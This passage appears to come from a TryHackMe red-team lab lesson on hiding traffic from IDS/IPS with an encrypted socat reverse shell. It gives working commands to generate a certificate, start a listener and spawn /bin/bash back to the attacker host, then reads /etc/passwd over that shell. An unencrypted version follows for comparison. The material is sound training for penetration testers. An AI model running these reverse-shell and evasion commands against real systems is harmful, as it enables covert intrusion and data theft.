
Because an IDS/IPS won’t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.

One direct approach is to create the necessary encryption key on the attacker’s system and set `socat` to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:

1. Create the key
2. Listen on the attacker’s machine
3. Connect to the attacker’s machine

**Firstly**, On the AttackBox or any Linux system, we can create the key using `openssl`.

`openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt`

The arguments in the above command are:

- `req` indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
- `-x509` specifies that we want an X.509 certificate
- `-newkey rsa:4096` creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as `-newkey rsa:2048`.)
- `-days 365` shows that the validity of our certificate will be one year
- `-subj` sets data, such as organization and country, via the command-line.
- `-nodes` simplifies our command and does not encrypt the private key
- `-keyout PRIVATE_KEY` specifies the filename where we want to save our private key
- `-out CERTIFICATE` specifies the filename to which we want to write the certificate request

The above command returns:

- Private key: `thm-reverse.key`
- Certificate: `thm-reverse.crt`

The Privacy Enhanced Mail (PEM) `.pem` file requires the concatenation of the private key `.key` and the certificate `.crt` files. We can use `cat` to create our PEM file from the two files that we have just created:

`cat thm-reverse.key thm-reverse.crt > thm-reverse.pem`.

**Secondly**, with the PEM file ready, we can start listening while using the key for encrypting the communication with the client.

`socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT`

If you are not familiar with `socat`, the options that we used are:

- `-d -d` provides some debugging data (fatal, error, warning, and notice messages)
- `OPENSSL-LISTEN:PORT_NUM` indicates that the connection will be encrypted using OPENSSL
- `cert=PEM_FILE` provides the PEM file (certificate and private key) to establish the encrypted connection
- `verify=0` disables checking peer’s certificate
- `fork` creates a sub-process to handle each new connection.

**Thirdly**, on the victim system, `socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash`. Note that the `EXEC` invokes the specified program.

Let’s demonstrate this. On the attacker system, we carried out the following:

Pentester Terminal

```shell-session
pentester@TryHackMe$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
Generating a RSA private key
........................++++
......++++
writing new private key to 'thm-reverse.key'
-----
pentester@TryHackMe$ ls
thm-reverse.crt  thm-reverse.key
pentester@TryHackMe$ cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
2022/02/24 13:39:07 socat[1208] W ioctl(6, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device
2022/02/24 13:39:07 socat[1208] N listening on AF=2 0.0.0.0:4443
```

As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:

Target Terminal

```shell-session
pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
```

Back to the attacker system, let’s run `cat /etc/passwd`:

Pentester Terminal

```shell-session
pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
[...]
2022/02/24 15:54:28 socat[7620] N starting data transfer loop with FDs [7,7] and [1,1]

cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
[...]
```

However, if the IDS/IPS inspects the traffic, all the packet data will be encrypted. In other words, the IPS will be completely oblivious to exchange traffic and commands such as `cat /etc/passwd`. The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet contains `cat /etc/passwd`; however, it is encrypted.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3352df7b863f48cfaf0aee8f308e95a9.png)  

As you can tell, it is not possible to make sense of the commands or data being exchanged. To better see the value of the added layer of encryption, we will compare this with an equivalent `socat` connection that does not use encryption.

1. On the attacker’s system, we run `socat -d -d TCP-LISTEN:4443,fork STDOUT`.
2. On the victim’s machine, we run `socat TCP:10.20.30.129:4443 EXEC:/bin/bash`.
3. Back on the attacker’s system, we type `cat /etc/passwd` and hit Enter/Return.

Because no encryption was used, capturing the traffic exchanged between the two systems will expose the commands, and the traffic exchanged. In the following screenshot, we can see the command sent by the attacker.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/08f8e9b8cdae4878dab23cbb57dfbbe2.png)  

Furthermore, it is a trivial task to follow the TCP stream as it is in cleartext and learn everything exchanged between the attacker and the target system. The screenshot below uses the “Follow TCP Stream” option from Wireshark.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/40f0e2f428db90b8b57d708d77eae99c.png)